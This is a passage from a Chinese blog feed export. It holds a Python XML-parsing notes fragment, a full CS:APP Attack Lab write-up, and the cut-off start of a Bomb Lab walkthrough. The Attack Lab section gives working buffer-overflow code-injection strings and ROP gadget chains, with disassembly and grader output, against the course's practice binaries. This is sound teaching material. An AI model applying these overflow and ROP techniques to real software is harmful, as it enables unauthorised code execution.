class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root.tag<span class="hljs-comment">#root元素的标记名</span></span><br><span class="line">root.attrib<span class="hljs-comment">#root元素的属性，为一个dic</span></span><br><span class="line"><span class="hljs-keyword">for</span> child <span class="hljs-keyword">in</span> root:<span class="hljs-comment">#便利子元素</span></span><br><span class="line">print(child.tag, child.attrib)</span><br><span class="line">root[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>].text <span class="hljs-comment">#将元素视为多维数组,用下标访问</span></span><br><span class="line">root.find(<span class="hljs-string">"element"</span>).text <span class="hljs-comment">#找出root下element下的内容字符串</span></span><br><span class="line">title = root.get(<span class="hljs-string">"Title"</span>) <span class="hljs-comment">#获取root元素的title属性</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> neighbor <span class="hljs-keyword">in</span> root.iter(<span class="hljs-string">'neighbor'</span>):<span class="hljs-comment">#遍历所有特定元素,递归到所有，子、孙...元素</span></span><br><span class="line">print(neighbor.attrib)</span><br><span class="line"><span class="hljs-keyword">for</span> country <span class="hljs-keyword">in</span> root.findall(<span class="hljs-string">'country'</span>):<span class="hljs-comment">#找出所有country元素，仅子代</span></span><br><span class="line">     rank = country.find(<span class="hljs-string">'rank'</span>).text</span><br><span class="line">     name = country.get(<span class="hljs-string">'name'</span>)</span><br><span class="line">     print(name, rank)</span><br><span class="line"><span class="hljs-keyword">for</span> country <span class="hljs-keyword">in</span> root.find(<span class="hljs-string">'country'</span>):<span class="hljs-comment">#仅找出第一个符合的子代</span></span><br></pre></td></tr></table></figure><h3 id="其他涉及知识"><a href="#其他涉及知识" class="headerlink" title="其他涉及知识"></a>其他涉及知识</h3><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mkdir</span><span class="hljs-params">(path)</span>:</span><span class="hljs-comment">#创建文件夹</span></span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path):</span><br><span class="line">        os.mkdir(path)</span><br><span class="line">        </span><br><span class="line"><span class="hljs-keyword">for</span> son_path <span class="hljs-keyword">in</span> os.listdir(root_path):<span class="hljs-comment">#遍历root_path下的文件</span></span><br><span class="line">    </span><br><span class="line">json.dump(dic, file_obj, ensure_ascii=<span class="hljs-keyword">False</span>, indent=<span class="hljs-number">4</span>, separators=(<span class="hljs-string">','</span>, <span class="hljs-string">': '</span>))<span class="hljs-comment">#将字典dic输出到文件file_obj中,不对ascii进行编码,缩进4,分隔符为','以及': '</span></span><br></pre></td></tr></table></figure><h3 id="暂时到此"><a href="#暂时到此" class="headerlink" title="暂时到此"></a>暂时到此</h3>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据清洗 </tag>
            
            <tag> ElementTree </tag>
            
            <tag> XML </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Attack_lab</title>
      <link href="/2018/12/08/Attack-lab/"/>
      <url>/2018/12/08/Attack-lab/</url>
      
        <content type="html"><![CDATA[<h3 id="实验描述"><a href="#实验描述" class="headerlink" title="实验描述"></a>实验描述</h3><a id="more"></a><p>本次实验利用程序需要外部输入的特点，输入机器码对程序返回值覆盖，以达到攻击的目的，即在getbuf函数需要的输入中做手脚，以致不能正常返回，执行攻击代码。</p><h4 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h4><p>第一阶段中栈随机化未开机，可以得知内存位置的确切地址，且栈中机器码可执行。</p><p>那么我们将需要执行的操作码和地址输入机器码即可。</p><h4 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h4><p>第一关非常简单，题目主要我们在getbuf执行完成后执行touch1,touch1()无参。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas getbuf </span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x0000000000401688 &lt;+0&gt;:sub    $0x18,%rsp</span><br><span class="line">   0x000000000040168c &lt;+4&gt;:mov    %rsp,%rdi</span><br><span class="line">   0x000000000040168f &lt;+7&gt;:callq  0x4018ca &lt;Gets&gt;</span><br><span class="line">   0x0000000000401694 &lt;+12&gt;:mov    $0x1,%eax</span><br><span class="line">   0x0000000000401699 &lt;+17&gt;:add    $0x18,%rsp</span><br><span class="line">   0x000000000040169d &lt;+21&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disas touch1</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004016a0 &lt;+0&gt;:sub    $0x8,%rsp</span><br><span class="line">   0x00000000004016a4 &lt;+4&gt;:movl   $0x1,0x2029ee(%rip)        # 0x60409c &lt;vlevel&gt;</span><br><span class="line">   0x00000000004016ae &lt;+14&gt;:mov    $0x402e4e,%edi</span><br><span class="line">   0x00000000004016b3 &lt;+19&gt;:callq  0x400bd0 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004016b8 &lt;+24&gt;:mov    $0x1,%edi</span><br><span class="line">   0x00000000004016bd &lt;+29&gt;:callq  0x401ab5 &lt;validate&gt;</span><br><span class="line">   0x00000000004016c2 &lt;+34&gt;:mov    $0x0,%edi</span><br><span class="line">   0x00000000004016c7 &lt;+39&gt;:callq  0x400d60 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>可以看到，getbuf开出了0x18，即24字节的空间，touch1的地址为0x4016a0。那么我们只需填满这0x28空间，再以touch1地址替代返回值。注意：x86-64机器中，采用小端法，其低位字节存放在低地址，故我们输入数据时，先输入低位。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">a0 16 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>转换后输入即可</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x63149380</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution <span class="hljs-keyword">for</span> level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">user id2017211523</span><br><span class="line">coursef18</span><br><span class="line">labattacklab</span><br><span class="line">result117:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A0 16 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><h4 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h4><p>第二关根据题意，需要调用touch2，需要传递一个无符号整数值，其值为cookie，查看cookie文件，如下。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2017211523@bupt3:~/target117$ cat cookie.txt </span><br><span class="line">0x63149380</span><br></pre></td></tr></table></figure><p>为了给touch2传参，我们需要将cookie值赋给%rdi，然后将touch2地址压栈，使用ret弹出touch2地址返回，调用touch2。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     $0x63149380,%rdi</span><br><span class="line">pushq   $0x4016cc</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>将其编译为二进制之后在反汇编，得到如下，由此我们便知指令的机器码是多少。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">phase2.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 80 93 14 63    mov    $0x63149380,%rdi</span><br><span class="line">   7:   68 cc 16 40 00          pushq  $0x4016cc</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure><p>我们将指令的机器码放在getbuf时的栈顶，然后将返回值位置设置为栈顶地址，这样既可达到目的，调用getbuf时栈顶地址为0x5566f7a8。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 80 93 14 63 68</span><br><span class="line">cc 16 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">a8 f7 66 55 00 00 00 00</span><br></pre></td></tr></table></figure><p>输入运行。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase2 | ./ctarget -q</span><br><span class="line">Cookie: 0x63149380</span><br><span class="line">Type string:Touch2!: You called touch2(0x63149380)</span><br><span class="line">Valid solution <span class="hljs-keyword">for</span> level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">user id2017211523</span><br><span class="line">coursef18</span><br><span class="line">labattacklab</span><br><span class="line">result117:PASS:0xffffffff:ctarget:2:48 C7 C7 80 93 14 63 68 CC 16 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00</span><br></pre></td></tr></table></figure><h4 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h4><p>查看touch3</p><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">touch3</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">vlevel = <span class="hljs-number">3</span>; <span class="hljs-comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="hljs-keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">validate(<span class="hljs-number">3</span>);</span><br><span class="line">&#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">fail(<span class="hljs-number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可知其需要一个指向字符的指针sval，然后调用hexmatch，将cookie和sval作为参数传入，需要hexomatch返回非零值。</p><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">hexmatch</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> val, <span class="hljs-keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">char</span> cbuf[<span class="hljs-number">110</span>];</span><br><span class="line">    <span class="hljs-comment">/* Make position of check string unpredictable */</span></span><br><span class="line">    <span class="hljs-keyword">char</span> *s = cbuf + random() % <span class="hljs-number">100</span>;</span><br><span class="line">    <span class="hljs-built_in">sprintf</span>(s, <span class="hljs-string">"%.8x"</span>, val);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">strncmp</span>(sval, s, <span class="hljs-number">9</span>) == <span class="hljs-number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由hexmatch可知，其比较cookie的字符串表示与传入的字符串是否相等，相等则返回1，那么问题明了，我们需要将表示cookie的字符串地址传给touch3，与第二题不同的是字符串需要有空间保存，我们需要在栈中找出调用hexmatch时候未被重写改变的空间，借以保存字符串。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     $0x5566f7c8,%rdi</span><br><span class="line">pushq   $0x4017a0</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>这里我们将cookie的字符串表示放在0x5566f7c8，编译再反汇编得到机器码</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">phase3.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 c8 f7 66 55    mov    $0x5566f7c8,%rdi</span><br><span class="line">   7:   68 a0 17 40 00          pushq  $0x4017a0</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure><p>查表得出cookie字符串的16进制表示为36 33 31 34 39 33 38  30，注意：以字符串形势比较时不用再反转输入，且字符串应有结尾字符‘\0’，得到攻击字符串如下</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 c8 f7 66 55 68</span><br><span class="line">a0 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">a8 f7 66 55 00 00 00 00</span><br><span class="line">36 33 31 34 39 33 38 30</span><br><span class="line">00</span><br></pre></td></tr></table></figure><p>转换输入运行</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase3 | ./ctarget -q</span><br><span class="line">Cookie: 0x63149380</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="hljs-string">"63149380"</span>)</span><br><span class="line">Valid solution <span class="hljs-keyword">for</span> level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">user id2017211523</span><br><span class="line">coursef18</span><br><span class="line">labattacklab</span><br><span class="line">result117:PASS:0xffffffff:ctarget:3:48 C7 C7 C8 F7 66 55 68 A0 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00 36 33 31 34 39 33 38 30 00</span><br></pre></td></tr></table></figure><h4 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h4><p>在此阶段，程序添加了两个现代计算机程序几乎必须的对抗缓缓冲区溢出攻击的措施：  </p><p>1.函数栈随机化 ，无法再获取绝对地址。  </p><p>2.栈内存的内容被锁定为不可执行。  </p><p>故此，我们需要使用ROP(面向返回编程)，即使用程序中本来就存在的代码组成我们需要的操作，再将其地址作为返回值，不断用ret指令返回完成所需操作。</p><h4 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h4><p>此关需用ROP方法完成phase_2内容。那么就需要在操作中得到cookie值，那么只有用pop指令了，需要指令为。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">movq%rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>查找官方的write up，得知对应机器码，然后在在rtarget文件的反汇编文件中利用vim查找对应代码地址。将其放入攻击字符串，得到攻击字符串为。  </p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">3c 18 40 00 00 00 00 00/*popq rax*/</span><br><span class="line">80 93 14 63 00 00 00 00/*cookie*/</span><br><span class="line">49 18 40 00 00 00 00 00/*movq %rax,%rdi */</span><br><span class="line">cc 16 40 00 00 00 00 00 /*touch2*/</span><br></pre></td></tr></table></figure><p>转换输入运行</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase4 | ./rtarget </span><br><span class="line">Cookie: 0x63149380</span><br><span class="line">Type string:Touch2!: You called touch2(0x63149380)</span><br><span class="line">Valid solution <span class="hljs-keyword">for</span> level 2 with target rtarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure><h4 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h4><p>此关为phase_3的ROP版本，我们需要查找start_farm到end_farm中的gadgets，拼凑出代码实现phase_3中插入代码的功能。还需注意：  </p><p>1.0x90代表nop，除了将pc加1之外不做任何事。  </p><p>2.不分双字节指令，设置标志位，不改变寄存器的值，可以使用。 </p><p>需要的指令有</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">movq%rsp,%rax</span><br><span class="line">movq%rax,%rdi</span><br><span class="line">popq%rax</span><br><span class="line">movl%eax,%ecx</span><br><span class="line">movl%ecx,%edx</span><br><span class="line">movl%edx,%esi</span><br><span class="line">lea(%rdi, %rsi, 1),%rax</span><br><span class="line">movq%rax,%rdi</span><br></pre></td></tr></table></figure><p>则攻击字符串为</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">bd 18 40 00 00 00 00 00/*gadget1*/</span><br><span class="line">49 18 40 00 00 00 00 00/*gadget2*/</span><br><span class="line">30 18 40 00 00 00 00 00/* gadget3*/</span><br><span class="line">48 00 00 00 00 00 00 00/*cookie字符串偏移量*/</span><br><span class="line">13 19 40 00 00 00 00 00/*gadget4*/</span><br><span class="line">ca 18 40 00 00 00 00 00/*gadget5*/</span><br><span class="line">b7 18 40 00 00 00 00 00/*gadget6*/</span><br><span class="line">69 18 40 00 00 00 00 00/*gadget7*/</span><br><span class="line">49 18 40 00 00 00 00 00/*gadget8*/</span><br><span class="line">a0 17 40 00 00 00 00 00 /*touch3地址      */</span><br><span class="line">36 33 31 34 39 33 38 30 /* cookie字符串  */</span><br><span class="line">00</span><br></pre></td></tr></table></figure><p>转换文件运行</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase5 | ./rtarget </span><br><span class="line">Cookie: 0x63149380</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="hljs-string">"63149380"</span>)</span><br><span class="line">Valid solution <span class="hljs-keyword">for</span> level 3 with target rtarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure><h3 id="到此为止"><a href="#到此为止" class="headerlink" title="到此为止"></a>到此为止</h3>]]></content>
      
      
      <categories>
          
          <category> CS:APP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS:APP </tag>
            
            <tag> 汇编 </tag>
            
            <tag> 代码注入攻击 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Bomb_lab2</title>
      <link href="/2018/12/01/Bomb_lab2/"/>
      <url>/2018/12/01/Bomb_lab2/</url>
      
        <content type="html"><![CDATA[<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><a id="more"></a><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>使用tar -vxf将炸弹压缩包解压,cd进入,可以从bomb.c中看出实验的用意以及程序的大致<br>逻辑,bomb为可执行程序,使用gdb调试该程序.<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b read_line </span><br><span class="line">Breakpoint 1 at 0x40155c</span><br><span class="line">(gdb) b explode_bomb </span><br><span class="line">Breakpoint 2 at 0x4014e4</span><br></pre></td></tr></table></figure></p><p>给read_line函数打上断点,以便每次输入运行一关.给explode_bomb打上断点,以便在炸弹爆炸<br>前可以处理.</p><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h3><p>获得phase_1汇编代码<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas phase_1</span><br><span class="line">Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> phase_1:</span><br><span class="line">   0x0000000000400e80 &lt;+0&gt;:sub    <span class="hljs-variable">$0x8</span>,%rsp</span><br><span class="line">   0x0000000000400e84 &lt;+4&gt;:mov    <span class="hljs-variable">$0x4024a0</span>,%esi</span><br><span class="line">   0x0000000000400e89 &lt;+9&gt;:callq  0x40127e &lt;strings_not_equal&gt;</span><br><span class="line">   0x0000000000400e8e &lt;+14&gt;:<span class="hljs-built_in">test</span>   %eax,%eax</span><br><span class="line">   0x0000000000400e90 &lt;+16&gt;:je     0x400e97 &lt;phase_1+23&gt;</span><br><span class="line">   0x0000000000400e92 &lt;+18&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400e97 &lt;+23&gt;:add    <span class="hljs-variable">$0x8</span>,%rsp</span><br><span class="line">   0x0000000000400e9b &lt;+27&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></p><p>可见,此题是将我们输入的字符串与地址0x4024a0处字符串比较,不等则爆炸.查看该字符串.<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x4024a0</span><br><span class="line">0x4024a0 &lt;__dso_handle+344&gt;: <span class="hljs-string">"We have to stand with our North Korean allies."</span></span><br></pre></td></tr></table></figure></p><p>那么答案是We have to stand with our North Korean allies.</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h3><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas phase_2</span><br><span class="line">Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> phase_2:</span><br><span class="line">   0x0000000000400e9c &lt;+0&gt;:push   %rbp</span><br><span class="line">   0x0000000000400e9d &lt;+1&gt;:push   %rbx</span><br><span class="line">   0x0000000000400e9e &lt;+2&gt;:sub    <span class="hljs-variable">$0x28</span>,%rsp</span><br><span class="line">   0x0000000000400ea2 &lt;+6&gt;:mov    %rsp,%rsi</span><br><span class="line">   0x0000000000400ea5 &lt;+9&gt;:callq  0x40151a &lt;read_six_numbers&gt;</span><br><span class="line">   0x0000000000400eaa &lt;+14&gt;:cmpl   <span class="hljs-variable">$0x1</span>,(%rsp)</span><br><span class="line">   0x0000000000400eae &lt;+18&gt;:je     0x400ed0 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400eb0 &lt;+20&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400eb5 &lt;+25&gt;:jmp    0x400ed0 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400eb7 &lt;+27&gt;:mov    -0x4(%rbx),%eax</span><br><span class="line">   0x0000000000400eba &lt;+30&gt;:add    %eax,%eax</span><br><span class="line">   0x0000000000400ebc &lt;+32&gt;:cmp    %eax,(%rbx)</span><br><span class="line">   0x0000000000400ebe &lt;+34&gt;:je     0x400ec5 &lt;phase_2+41&gt;</span><br><span class="line">   0x0000000000400ec0 &lt;+36&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400ec5 &lt;+41&gt;:add    <span class="hljs-variable">$0x4</span>,%rbx</span><br><span class="line">   0x0000000000400ec9 &lt;+45&gt;:cmp    %rbp,%rbx</span><br><span class="line">   0x0000000000400ecc &lt;+48&gt;:jne    0x400eb7 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400ece &lt;+50&gt;:jmp    0x400edc &lt;phase_2+64&gt;</span><br><span class="line">   0x0000000000400ed0 &lt;+52&gt;:lea    0x4(%rsp),%rbx</span><br><span class="line">   0x0000000000400ed5 &lt;+57&gt;:lea    0x18(%rsp),%rbp</span><br><span class="line">   0x0000000000400eda &lt;+62&gt;:jmp    0x400eb7 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400edc &lt;+64&gt;:add    <span class="hljs-variable">$0x28</span>,%rsp</span><br><span class="line">---Type &lt;<span class="hljs-built_in">return</span>&gt; to <span class="hljs-built_in">continue</span>, or q &lt;<span class="hljs-built_in">return</span>&gt; to quit---</span><br><span class="line">   0x0000000000400ee0 &lt;+68&gt;:pop    %rbx</span><br><span class="line">   0x0000000000400ee1 &lt;+69&gt;:pop    %rbp</span><br><span class="line">   0x0000000000400ee2 &lt;+70&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>+3处发现在栈中开辟了0x28的内存区域.然后将%rsp的值传给%rsi作为<br>参数传给函数read_six_numbers,可以看出应该使用开辟的空闲内存做<br>数组,记数组为r,读取六个数字.将(%rsp)和0x1比较,如果不等,就会爆<br>炸,(％rsp)为数组首元,故r[0]＝１;跳转到+52,将r[1]地址赋给%rbx,<br>将r<a 